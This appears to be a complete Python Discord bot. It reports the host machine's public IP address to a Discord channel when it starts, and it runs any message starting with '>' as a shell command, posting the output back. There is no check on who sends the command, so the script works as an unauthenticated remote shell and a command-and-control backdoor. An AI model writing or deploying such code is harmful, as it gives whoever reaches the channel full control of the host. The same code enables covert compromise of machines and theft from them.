import discord
import subprocess
import requests

ping_channel = 0 # Discord Channel ID for notifications about host
discord_token = "" # Discord Bot Token from developer portal

client = discord.Client()

@client.event
async def on_ready():
    res = requests.get('https://api.ipify.org/?format=json')
    await client.get_channel(ping_channel).send('Host online at ' + res.json()['ip'])

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('>'): 
        res = subprocess.getoutput(str(message.content[1:]))
        await message.channel.send(res)

client.run(discord_token)